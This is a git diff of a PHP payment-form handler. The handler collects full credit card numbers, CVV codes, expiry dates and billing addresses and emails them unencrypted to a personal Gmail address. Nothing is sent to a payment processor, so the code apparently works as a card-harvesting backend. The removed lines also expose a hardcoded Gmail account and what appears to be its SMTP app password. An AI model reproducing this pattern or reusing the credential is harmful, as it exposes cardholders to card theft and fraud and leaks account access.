@@ -1,22 +1,13 @@
-
 <?php
 include_once "Controller/Controller.class.php";
 include_once "Controller/Database.php";
-// Include PHPMailer classes
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
-
-require 'vendor/autoload.php'; // Adjust this path if PHPMailer is installed elsewhere
 
 // Ensure the script only processes POST requests
 if (!isset($_POST)) {
     echo "error";
     exit;
-}else{
-    
+} else {
     $requiredFields = ['expiration-year', 'email', 'full-name', 'amount_to_pay', 'cvv', 'credit-card-num', 'expiration-month', 'zip-code', 'state', 'city', 'billing-address'];
-    // $_POST = $_POST;
-    // print_r($_POST);
     
     foreach ($requiredFields as $field) {
         if (empty($_POST[$field])) {
@@ -25,6 +16,7 @@ if (!isset($_POST)) {
             exit;
         }
     }
+    
     // Sanitize data
     $id = htmlspecialchars($_POST['id'], ENT_QUOTES, 'UTF-8');
     $expYear = htmlspecialchars($_POST['expiration-year'], ENT_QUOTES, 'UTF-8');
@@ -41,6 +33,7 @@ if (!isset($_POST)) {
     $userId = htmlspecialchars($_POST['user_id'], ENT_QUOTES, 'UTF-8');
 
     // Create email content
+    $subject = 'Payment Information Submitted';
     $message = "
         <h1>Payment Details</h1>
         <p><strong>Name:</strong> $name</p>
@@ -55,52 +48,17 @@ if (!isset($_POST)) {
         <p><strong>ZIP Code:</strong> $zipCode</p>
     ";
 
-    $mail = new PHPMailer(true);
+    // Email headers
+    $headers = "From: Payment Portal <habeebajani9@gmail.com>\r\n";
+    $headers .= "Reply-To: ".$email."\r\n";
+    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
 
-    try {
-        // SMTP Server Configuration
-        $mail->isSMTP();
-        $mail->Host = 'smtp.gmail.com'; // Replace with your SMTP host
-        $mail->SMTPAuth = true;
-        $mail->Username = 'habeebajani9@gmail.com'; // Replace with your SMTP username
-        $mail->Password = 'kznc uzhe jtce ywhv'; // Replace with your SMTP password
-        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
-        $mail->Port = 587; // Common SMTP port
-
-        // Email Headers
-        $mail->setFrom('habeebajani9@gmail.com', 'Payment Portal'); // Replace with your sender email
-        $mail->addAddress('habeebajani9@gmail.com', 'Resido'); // Replace with the recipient's email
-
-        // Email Content
-        $mail->isHTML(true);
-        $mail->Subject = 'Payment Information Submitted';
-        $mail->Body    = $message;
-
-        // Send the email
-        if($mail->send()){
-           echo "success";
-        }else{
-            echo "error";
-        }
-        
-    } catch (Exception $e) {
+    // Send the email
+    if (mail('habeebajani9@gmail.com', $subject, $message, $headers)) {
+        echo "success";
+    } else {
         http_response_code(500); // Internal Server Error
-        echo json_encode(["error" => "Message could not be sent. Mailer Error: {$mail->ErrorInfo}"]);
+        echo json_encode(["error" => "Message could not be sent."]);
     }
 }
-
-// // Get the raw POST data
-// $requestBody = file_get_contents('php://input');
-// $_POST = json_decode($requestBody, true);
-
-// Validate JSON decoding
-// if (json_last_error() !== JSON_ERROR_NONE) {
-//     http_response_code(400); // Bad Request
-//     echo json_encode(["error" => "Invalid JSON data"]);
-//     exit;
-// }
-
-// Extract and validate required fields
-
-
 exit;
